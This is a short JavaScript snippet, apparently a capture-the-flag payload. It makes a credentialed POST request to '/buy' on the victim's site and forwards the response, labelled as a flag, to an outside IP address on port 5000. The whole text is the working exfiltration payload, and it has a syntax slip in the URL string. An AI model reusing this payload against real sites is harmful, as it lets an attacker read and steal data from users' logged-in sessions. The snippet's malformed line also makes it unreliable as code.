const formData = new FormData();
formData.append("id", "0");
fetch("/buy", {
method: "POST",
body: formData,
credentials: 'include'
}).then(response => response.text())
.then(text => {
const formData2 = new FormData();
formData2.append("flag", text);
return fetch("https://120.26.219.126:5000/flag), {
method: "POST",
body: formData2,
mode:'no-cors',
});
})
